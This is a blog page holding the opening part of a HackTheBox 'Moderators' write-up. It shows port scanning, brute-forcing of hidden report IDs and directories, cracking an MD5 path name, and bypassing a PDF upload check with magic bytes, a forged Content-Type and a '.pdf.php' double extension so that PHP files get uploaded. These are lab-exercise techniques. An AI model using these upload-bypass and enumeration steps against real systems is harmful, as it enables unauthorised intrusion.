<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="MØstXeon">
<meta name="description" content="false" />
<meta name="keywords" content=", HackTheBox, Linux, File-Upload, Bruteforce, PHP, Bypass-File-Extension-Validation, Burp-Suite, Disable-Functions, Uploading-Files-curl, Wordpress, Port-Forwarding, Chisel, mysql, Password-Cracking, Hashcat, bruteforce-luks, VirtualBox, VirtualBox-Encryption, Luks2, Clear-Text-Credentials, Password-Reuse" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://mostxeon.github.io/posts/moderators/" />


    <title>
        
            Moderators Write-Up :: MØst Xeon  — Simple Cyber Security Blog
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.653e12f307c49620b5b1ba68d8bf5a05c6ab0038af0589bca65686d5dbc02602.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Moderators Write-Up">
<meta itemprop="description" content="false"><meta itemprop="datePublished" content="2022-11-03T14:54:40+02:00" />
<meta itemprop="dateModified" content="2022-11-03T14:54:40+02:00" />
<meta itemprop="wordCount" content="4880">
<meta itemprop="keywords" content="HackTheBox,Linux,File-Upload,Bruteforce,PHP,Bypass-File-Extension-Validation,Burp-Suite,Disable-Functions,Uploading-Files-curl,Wordpress,Port-Forwarding,Chisel,mysql,Password-Cracking,Hashcat,bruteforce-luks,VirtualBox,VirtualBox-Encryption,Luks2,Clear-Text-Credentials,Password-Reuse," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Moderators Write-Up"/>
<meta name="twitter:description" content="false"/>







    <meta property="article:published_time" content="2022-11-03 14:54:40 &#43;0200 EET" />









    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PQV7ZN74BD"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-PQV7ZN74BD', { 'anonymize_ip': false });
}
</script>


    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#</span>
            <span class="logo__text">cd ~</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li>
                <a href="/posts/">#ls posts</a><span class="logo__cursor" style="margin: 0"></span>
            </li><li>
                <a href="/tags/">#ls tags</a><span class="logo__cursor" style="margin: 0"></span>
            </li><li>
                <a href="/difficulty">#ls difficulty</a><span class="logo__cursor" style="margin: 0"></span>
            </li><li>
                <a href="/about">#whoami</a><span class="logo__cursor" style="margin: 0"></span>
            </li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        23 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://mostxeon.github.io/posts/moderators/">Moderators Write-Up</a>
      </h1>

      

      
        <figure class="post-cover">
          <img src="https://www.hackthebox.com/storage/avatars/81e0e2faf89367bccc035b3a73313245.png" alt="Moderators Write-Up" />
          
          
            <figcaption class="center">Machine created by 

<a href="https://app.hackthebox.com/profile/389926" target="_blank">kavigihan</a></figcaption>
          
        </figure>
      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#initial-recon">Initial Recon</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#surfing-the-webpage">Surfing The Webpage</a></li>
        <li><a href="#discovering-hidden-reports">Discovering Hidden Reports</a></li>
        <li><a href="#discovering-an-information-disclosure">Discovering An Information Disclosure</a></li>
        <li><a href="#discovering-pdf-logs">Discovering PDF Logs</a></li>
      </ul>
    </li>
    <li><a href="#discovering-a-hidden-upload-functionalitiy">Discovering a Hidden Upload Functionalitiy</a>
      <ul>
        <li><a href="#learing-how-pdf-validation-works">Learing How PDF Validation Works</a></li>
        <li><a href="#uploading-php-files-to-run-code">Uploading PHP Files To Run Code</a></li>
        <li><a href="#bypassing-disable-functions-using-mail-to-get-rce">Bypassing Disable Functions using mail() To Get RCE</a></li>
      </ul>
    </li>
    <li><a href="#post-enumeration-as-www-data">Post Enumeration As www-data</a>
      <ul>
        <li><a href="#discovering-vulnerable-wordpress-plugin">Discovering Vulnerable Wordpress Plugin</a></li>
        <li><a href="#exploiting-the-vulnerability-to-get-user">Exploiting The Vulnerability To Get User</a></li>
      </ul>
    </li>
    <li><a href="#post-enumeration-as-lexi">Post Enumeration As Lexi</a>
      <ul>
        <li><a href="#portforwarding-wordpress">PortForwarding Wordpress</a></li>
        <li><a href="#logging-in-as-admin">Logging In As Admin</a></li>
        <li><a href="#reading-johns-ssh-keys">Reading John&rsquo;s SSH Keys</a></li>
      </ul>
    </li>
    <li><a href="#post-enumeration-as-john">Post Enumeration As John</a></li>
    <li><a href="#inspecting-vm-files">Inspecting VM Files</a>
      <ul>
        <li><a href="#cracking-vdi-file">Cracking VDI File</a></li>
        <li><a href="#decrypt-vdi-file-and-attach-it-to-kali">Decrypt VDI File And Attach It To Kali</a></li>
        <li><a href="#cracking-luks2-encryption">Cracking LUKS2 Encryption</a></li>
      </ul>
    </li>
    <li><a href="#finding-johns-password-and-escalating-to-root">Finding John&rsquo;s Password And Escalating To Root</a></li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan using nmap, I got the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sC -sV -vvv -oN nmap/nmap-all-tcp.txt -p- 10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.173
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-08-12 20:36:48 EEST <span style="color:#66d9ef">for</span> 442s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVKTX9lrW0T2kgN/idXDQgowtSSGNJiULsNel0JKKX42GCLWDVSaDcZCcuPsxwxOYxSvEPmU8N7ZLka7rFJNBSbnlnfI4pP8r2ZYwB4Ioa+mJ7lkdmexkabiDupyue1hd2QNJ8mHjmPNd9LByhOq+CsXTdXe50qkhnSxil8inp8r4zAFDwWYCpjt2EeBKqqyWSlQptU+mjLfIP7903sUfLNhkKtEdEJfiGfpfd4QYCVWmqsWPD0q/S69/mDZ7Ic0Bhj4VVXVQkkxDIyG3NmNtY1dF/uxvB86Ca+q/bO0PUZ/PEI2EaoXydS5YVHb2ZxLy17ltoDC0JW+wogVe/+NV75tqOQESQfyqFTZOnpq2jBgrXq90FczUr1Rl/7JQZ4V5nt+asvhxFRs94qxidRdf60aP/Izgkg1UltttQCS4s984Lfnfmk1LVlJ74Q/QMZZIGdRf8HwZzqqW/zBLozU0FbSdq8kOXFhZDeLqCfrVLvBncD3fHjKj+h7gSq3nFbWk<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIEFsa05VSw1Z4FCOfBS4hGgxc7g6Z9Giortn/lxqktVOBrkAyUfJRs7AteBGqIyjHNOQJi97xMufArOj4vQJwU<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP3W656yOHPoAqoWckwZsh/ZzF1IX/9rN+LB9MkS56OI
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-title: Moderators
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Fri Aug 12 20:44:10 2022 -- 1 IP address (1 host up) scanned in 442.82 seconds</span>
</span></span></code></pre></div><p>I can see that ports <em>80</em> (webserver) and <em>22</em> (SSH) are open.</p>
<h3 id="surfing-the-webpage">Surfing The Webpage</h3>
<p>Looks like it is a website that provides some security services.</p>
<p><img src="home_page.png" alt="Home Page"></p>
<p>And has some pages that I can navigate to:
<img src="home_page_footer.png" alt="Home Page Footer"></p>
<p>The most interesting page was the blog page where they disclosed some vulnerabilities that they have found for customers:</p>
<p><img src="blog_page.png" alt="Blog Page"></p>
<p><img src="blog_reports.png" alt="Blog Reports"></p>
<h3 id="discovering-hidden-reports">Discovering Hidden Reports</h3>
<p>And it appears that some of these listed reports have <em>links</em> refering to them, by providing their <em>ID</em> as a <em>GET parameter</em>, but some others don&rsquo;t. However, the available reports didn&rsquo;t provide useful information, so I though of <em>bruteforcing</em> the numbers looking for some <em>hidden reports</em>.</p>
<p>I&rsquo;ll use 

<a href="http://www.edge-security.com/wfuzz.php" target="_blank"><em>WFuzz</em></a> with the <code>-z range,</code> flag to specify the range of numbers to use as payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz -z range,0-20000 -u http://10.10.11.173/reports.php?report<span style="color:#f92672">=</span>FUZZ --hc <span style="color:#ae81ff">302</span> --hh <span style="color:#ae81ff">7888</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://10.10.11.173/reports.php?report<span style="color:#f92672">=</span>FUZZ
</span></span><span style="display:flex;"><span>Total requests: 20001
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000002590:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">274</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9786</span> Ch     <span style="color:#e6db74">&#34;2589&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000003479:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">275</span> L    <span style="color:#ae81ff">526</span> W      <span style="color:#ae81ff">9831</span> Ch     <span style="color:#e6db74">&#34;3478&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000004222:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">273</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9880</span> Ch     <span style="color:#e6db74">&#34;4221&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000007613:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">275</span> L    <span style="color:#ae81ff">523</span> W      <span style="color:#ae81ff">9790</span> Ch     <span style="color:#e6db74">&#34;7612&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000008122:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">273</span> L    <span style="color:#ae81ff">522</span> W      <span style="color:#ae81ff">9784</span> Ch     <span style="color:#e6db74">&#34;8121&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>000009799:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">276</span> L    <span style="color:#ae81ff">525</span> W      <span style="color:#ae81ff">9887</span> Ch     <span style="color:#e6db74">&#34;9798&#34;</span>                                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">20001</span>
</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">19995</span>
</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h3 id="discovering-an-information-disclosure">Discovering An Information Disclosure</h3>
<p>Navigating through newly discovered reports, I found that the report with id <em>9798</em> shows an information disclosure in <em>/logs/e21cece511f43a5cb18d4932429915ed/</em>.</p>
<p><img src="report_9798.png" alt="Report 9798"></p>
<p>The last part looks like an md5 hash so I&rsquo;ll try to crack it using hashcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> e21cece511f43a5cb18d4932429915ed /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>e21cece511f43a5cb18d4932429915ed:9798
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>It looks like the hash of the report&rsquo;s ID is the one used here.</p>
<h3 id="discovering-pdf-logs">Discovering PDF Logs</h3>
<p>From the <em>service.php</em> page, I saw that they only accept <em>PDF</em> files:</p>
<p><img src="only_pdf_notice.png" alt="PDF Files Notice"></p>
<p>Using this information, I will try to <em>bruteforce files of /logs/e21cece511f43a5cb18d4932429915ed/</em> by appending <em>.pdf</em> at the end of each wordlist keyword from 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-words.txt" target="_blank"><em>raft-medium-words.txt</em></a>, using 

<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 88ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>logs                    <span style="color:#f92672">[</span>Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 131ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htm                    <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3880ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 81ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I found <em>logs.pdf</em> being present in this directory, however it shows that logs are removed.</p>
<p><img src="logs_removed.png" alt="Logs Removed"></p>
<h2 id="discovering-a-hidden-upload-functionalitiy">Discovering a Hidden Upload Functionalitiy</h2>
<p>Cycling through other report&rsquo;s logs, I found that there are few of them disclosing <em>/logs/report_log_upload.php</em> path that appears to be the hidden way to upload files to the application.</p>
<ul>
<li>Making a list of md5 hashes for each report:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat report_number.txt 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2589</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3478</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4221</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7612</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8121</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9798</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">for</span> nums in <span style="color:#66d9ef">$(</span>cat report_number.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo -n $nums <span style="color:#e6db74">&#34;=&gt; &#34;</span>; echo -n $nums|md5sum; <span style="color:#66d9ef">done</span> &gt; report_hashes
</span></span><span style="display:flex;"><span>$ cat report_hashes 
</span></span><span style="display:flex;"><span>2589 <span style="color:#f92672">=</span>&gt; 743c41a921516b04afde48bb48e28ce6  -
</span></span><span style="display:flex;"><span>3478 <span style="color:#f92672">=</span>&gt; b071cfa81605a94ad80cfa2bbc747448  -
</span></span><span style="display:flex;"><span>4221 <span style="color:#f92672">=</span>&gt; 74d90aafda34e6060f9e8433962d14fd  -
</span></span><span style="display:flex;"><span>7612 <span style="color:#f92672">=</span>&gt; ce5d75028d92047a9ec617acb9c34ce6  -
</span></span><span style="display:flex;"><span>8121 <span style="color:#f92672">=</span>&gt; afecc60f82be41c1b52f6705ec69e0f1  -
</span></span><span style="display:flex;"><span>9798 <span style="color:#f92672">=</span>&gt; e21cece511f43a5cb18d4932429915ed  -
</span></span></code></pre></div></li>
</ul>
<p><img src="upload_php_leak.png" alt="Upload.php Leak"></p>
<p><img src="upload_page.png" alt="Upload.php Page"></p>
<p>I&rsquo;ll try to upload a dummy file and intercept the request with 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>:</p>
<p><img src="burp_exploring_upload.png" alt="Intercepting Request With BurpSuite"></p>
<p>From the repeater tab, I tried to send the request as is, howerver I got an error that <em>only PDF are allowed</em>:</p>
<p><img src="Only_pdf_allowed.png" alt="Only PDF Files Are Allowed"></p>
<h3 id="learing-how-pdf-validation-works">Learing How PDF Validation Works</h3>
<p>So I need to know how this restriction is applied, in other words, I need to know if the application is checking the <em>extension</em> or the <em>content</em> of the uploaded file, or <em>both</em>, or even the <em>Content-Type</em> http header, to know if I can find some possible bypasses.</p>
<p>I&rsquo;ll try to upload the same dummy file content, but this time I&rsquo;ll change its extension to <em>.pdf</em>:</p>
<p><img src="changing_extension.png" alt="Changing File Extension"></p>
<p>I got the <em>same error</em>, which means that the backend is doing some other checks, so now I&rsquo;ll change the <em>Content-Type</em> header value to <em>application/pdf</em>:</p>
<p><img src="changing_headers.png" alt="Changing Content-Type header value"></p>
<p>Again same error.</p>
<p>This time, I&rsquo;ll alter the content of the file by adding a <em>valid PDF header</em> at the beginning (also called <em>magic bytes</em> or <em>file signature</em>):</p>
<ul>
<li>A list of file signature for various file types can be found here: <em>

<a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank">https://en.wikipedia.org/wiki/List_of_file_signatures</a></em></li>
</ul>
<p>In my case, this is the hex representation of <em>pdf magic bytes</em> <code>25 50 44 46 2D</code>,  and this is the ascii representation <code>%PDF-</code>:</p>
<p><img src="file_uploaded_successfully.png" alt="File Upload Worked"></p>
<p>My dummy file has been uploaded successfully!! If I try to remove any of the previous changes the server will not accept it, which means that it is checking for everyone of these three.</p>
<h3 id="uploading-php-files-to-run-code">Uploading PHP Files To Run Code</h3>
<p>Now that I identified what the server is checking, I need to find a way to bypass this checking and upload a malicious php file.</p>
<p>First thing I&rsquo;ll try is to change the extension to <em>.pdf.php</em>, because sometimes servers check only for <em>.pdf</em> in the filename without making sure that it comes at the end:</p>
<p><img src="uploading_php_file.png" alt="Uploading A PHP File"></p>
<p>And it worked!! Now, I am able to upload php files to the server. However, I still don&rsquo;t know the location where these files are being stored. That&rsquo;s why I&rsquo;ll try to bruteforce directories inside <em>/logs/</em> looking for any hidden one where I can find these uploaded files.</p>
<p>I&rsquo;ll use 

<a href="https://github.com/OJ/gobuster" target="_blank"><em>Gobuster</em></a> and 

<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt" target="_blank"><em>common.txt</em></a> wordlist from 

<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>SecLists</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.173/logs/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.2.0-dev
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.11.173/logs/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/11/04 14:13:20 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 315<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.173/logs/css/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 319<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.11.173/logs/uploads/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4704</span> / <span style="color:#ae81ff">4714</span> <span style="color:#f92672">(</span>99.79%<span style="color:#f92672">)===============================================================</span>
